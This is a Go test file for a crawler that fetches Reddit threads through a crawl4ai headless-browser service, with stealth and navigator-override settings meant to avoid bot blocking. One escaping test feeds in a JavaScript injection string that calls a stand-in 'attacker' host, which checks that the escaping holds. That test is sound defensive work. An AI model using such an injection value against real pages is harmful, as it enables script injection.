package reddit

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/kinorai/search-crawl-reddit-proxy/internal/httpx"
)

func mustJSON(v interface{}) []byte { b, _ := json.Marshal(v); return b }

// crawl4aiOK builds a successful /crawl response whose single result's
// js_execution_result wraps a {s,b} fetch envelope — the exact 4-layer shape
// browserFetch must unwrap (crawl4ai resp → results[0].js_execution_result.
// results[0] → JSON-encoded string → {s,b} → reddit body).
func crawl4aiOK(fetchStatus int, fetchBody string) []byte {
	env := mustJSON(fetchEnvelope{S: fetchStatus, B: fetchBody})
	return mustJSON(map[string]interface{}{
		"success": true,
		"results": []interface{}{map[string]interface{}{
			"success":             true,
			"status_code":         200,
			"js_execution_result": map[string]interface{}{"results": []interface{}{string(env)}},
		}},
	})
}

func TestFetchThread(t *testing.T) {
	const permalink = "/r/news/comments/abc123/some_title/"
	validReddit := `[{"kind":"Listing","data":{"children":[]}},{"kind":"Listing","data":{"children":[]}}]`

	cases := []struct {
		name       string
		httpStatus int
		body       []byte
		wantBody   string
		wantErr    string // substring; "" = expect success
	}{
		{"success returns reddit body", 200, crawl4aiOK(200, validReddit), validReddit, ""},
		{"reddit 403 block", 200, crawl4aiOK(403, "<html>You've been blocked</html>"), "", "reddit returned 403"},
		{"non-JSON reddit body", 200, crawl4aiOK(200, "<html>not json</html>"), "", "not JSON"},
		{"crawl4ai 5xx (anti-bot)", 500, []byte(`{"error":"Blocked by anti-bot protection"}`), "", "500"},
		{"crawl4ai 4xx", 400, []byte(`{"error":"bad request"}`), "", "crawl4ai returned 400"},
		{"crawl4ai result failed", 200, mustJSON(map[string]interface{}{
			"success": true,
			"results": []interface{}{map[string]interface{}{"success": false, "error_message": "nav timeout"}},
		}), "", "result failed"},
		{"empty js result", 200, mustJSON(map[string]interface{}{
			"success": true,
			"results": []interface{}{map[string]interface{}{
				"success": true, "js_execution_result": map[string]interface{}{"results": []interface{}{}}}},
		}), "", "no js result"},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				w.WriteHeader(tc.httpStatus)
				_, _ = w.Write(tc.body)
			}))
			defer srv.Close()

			f := NewFetcher(httpx.New(nil), srv.URL)
			got, err := f.FetchThread(context.Background(), permalink)

			if tc.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
					t.Fatalf("want error containing %q, got %v", tc.wantErr, err)
				}
				return
			}
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if string(got) != tc.wantBody {
				t.Fatalf("body mismatch:\n got: %s\nwant: %s", got, tc.wantBody)
			}
		})
	}
}

// TestFetcherMissingEndpoint: with no crawl4ai URL, fetches fail fast (mirrors
// the config-level guard for the same reason).
func TestFetcherMissingEndpoint(t *testing.T) {
	f := NewFetcher(httpx.New(nil), "")
	if _, err := f.FetchThread(context.Background(), "/r/news/comments/abc/t/"); err == nil {
		t.Fatal("expected error when crawl4ai URL is empty")
	}
}

// TestRequestShape locks the crawl4ai knobs the binary sends: stealth on,
// magic/simulate_user OFF (the D decision), and the session reuse / js_only
// split between thread (navigate) and morechildren (reuse).
func TestRequestShape(t *testing.T) {
	var captured []byte
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		captured, _ = io.ReadAll(r.Body)
		_, _ = w.Write(crawl4aiOK(200, `[{"kind":"Listing","data":{"children":[]}}]`))
	}))
	defer srv.Close()
	f := NewFetcher(httpx.New(nil), srv.URL)

	decode := func() c4aRequest {
		t.Helper()
		var req c4aRequest
		if err := json.Unmarshal(captured, &req); err != nil {
			t.Fatalf("decode captured request: %v", err)
		}
		return req
	}

	// FetchThread navigates and creates the session.
	if _, err := f.FetchThread(context.Background(), "/r/news/comments/abc123/some_title/"); err != nil {
		t.Fatal(err)
	}
	req := decode()
	if req.BrowserConfig.Params["enable_stealth"] != true {
		t.Error("enable_stealth must be set")
	}
	if req.CrawlerConfig.Params["override_navigator"] != true {
		t.Error("override_navigator must be set")
	}
	if _, ok := req.CrawlerConfig.Params["magic"]; ok {
		t.Error("magic must be omitted (D)")
	}
	if _, ok := req.CrawlerConfig.Params["simulate_user"]; ok {
		t.Error("simulate_user must be omitted (D)")
	}
	if req.CrawlerConfig.Params["session_id"] != "carp-reddit-abc123" {
		t.Errorf("session_id = %v, want carp-reddit-abc123", req.CrawlerConfig.Params["session_id"])
	}
	if _, ok := req.CrawlerConfig.Params["js_only"]; ok {
		t.Error("FetchThread must navigate (no js_only)")
	}

	// FetchMoreChildren reuses the same warmed session without re-navigating.
	if _, err := f.FetchMoreChildren(context.Background(), "t3_abc123", []string{"x1", "x2"}); err != nil {
		t.Fatal(err)
	}
	req = decode()
	if req.CrawlerConfig.Params["js_only"] != true {
		t.Error("FetchMoreChildren must reuse the session (js_only)")
	}
	if req.CrawlerConfig.Params["session_id"] != "carp-reddit-abc123" {
		t.Errorf("morechildren session_id = %v, want carp-reddit-abc123", req.CrawlerConfig.Params["session_id"])
	}
}

func TestThreadSession(t *testing.T) {
	cases := map[string]string{
		"/r/news/comments/abc123/some_title/": "carp-reddit-abc123",
		"/r/news/comments/xyz/":               "carp-reddit-xyz",
		"/r/news/":                            "",
	}
	for in, want := range cases {
		if got := threadSession(in); got != want {
			t.Errorf("threadSession(%q) = %q, want %q", in, got, want)
		}
	}
}

// TestJSLit locks the injection-safety guarantee: jsLit output must always be a
// valid JS/JSON string literal that round-trips to the input — so a smuggled
// quote/backslash can never break out of the literal in the JS we send.
func TestJSLit(t *testing.T) {
	for _, in := range []string{
		`https://www.reddit.com/r/x/comments/abc/t.json?a=1`,
		`evil"; fetch("http://attacker"); //`,
		`back\slash`,
		"tab\tand\nnewline",
		`</script><b>`,
	} {
		out := jsLit(in)
		var back string
		if err := json.Unmarshal([]byte(out), &back); err != nil || back != in {
			t.Errorf("jsLit(%q)=%q is not a round-tripping literal (err=%v back=%q)", in, out, err, back)
		}
	}
}

func TestGetPostJS(t *testing.T) {
	u := "https://www.reddit.com/r/x/comments/abc/t.json?raw_json=1"
	g := getJS(u)
	if !strings.Contains(g, "fetch("+jsLit(u)) {
		t.Errorf("getJS missing escaped url: %s", g)
	}
	if !strings.Contains(g, "JSON.stringify({s: r.status, b: await r.text()})") {
		t.Errorf("getJS missing envelope return: %s", g)
	}

	body := "api_type=json&children=a%2Cb&link_id=t3_abc"
	p := postJS("https://www.reddit.com/api/morechildren", body)
	if !strings.Contains(p, `"POST"`) {
		t.Errorf("postJS not a POST: %s", p)
	}
	if !strings.Contains(p, "body: "+jsLit(body)) {
		t.Errorf("postJS missing escaped form body: %s", p)
	}
}

func TestIsShareURL(t *testing.T) {
	share := []string{
		"https://www.reddit.com/r/news/s/abc123",
		"https://www.reddit.com/r/OpenWebUI/s/ibnxYbmeOE",
	}
	for _, u := range share {
		if !IsShareURL(u) {
			t.Errorf("IsShareURL(%q) = false, want true", u)
		}
	}
	notShare := []string{
		"https://www.reddit.com/r/news/comments/abc/t/",
		"https://www.reddit.com/r/news/",
	}
	for _, u := range notShare {
		if IsShareURL(u) {
			t.Errorf("IsShareURL(%q) = true, want false", u)
		}
	}
}

// crawl4aiRawJS builds a /crawl response whose js_execution_result returns a
// plain string (e.g. location.href) rather than a {s,b} envelope.
func crawl4aiRawJS(jsReturn string) []byte {
	return mustJSON(map[string]interface{}{
		"success": true,
		"results": []interface{}{map[string]interface{}{
			"success": true, "status_code": 200,
			"js_execution_result": map[string]interface{}{"results": []interface{}{jsReturn}},
		}},
	})
}

func TestResolveShareURL(t *testing.T) {
	canonical := "https://www.reddit.com/r/news/comments/abc123/title/?utm_source=share"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(crawl4aiRawJS(canonical))
	}))
	defer srv.Close()
	f := NewFetcher(httpx.New(nil), srv.URL)
	got, err := f.ResolveShareURL(context.Background(), "https://www.reddit.com/r/news/s/abc")
	if err != nil || got != canonical {
		t.Fatalf("ResolveShareURL = %q, %v; want %q", got, err, canonical)
	}

	// A resolution that isn't a thread is an error.
	srv2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = w.Write(crawl4aiRawJS("https://www.reddit.com/r/news/"))
	}))
	defer srv2.Close()
	f2 := NewFetcher(httpx.New(nil), srv2.URL)
	if _, err := f2.ResolveShareURL(context.Background(), "https://www.reddit.com/r/news/s/abc"); err == nil {
		t.Error("expected error when share link resolves to a non-thread URL")
	}
}
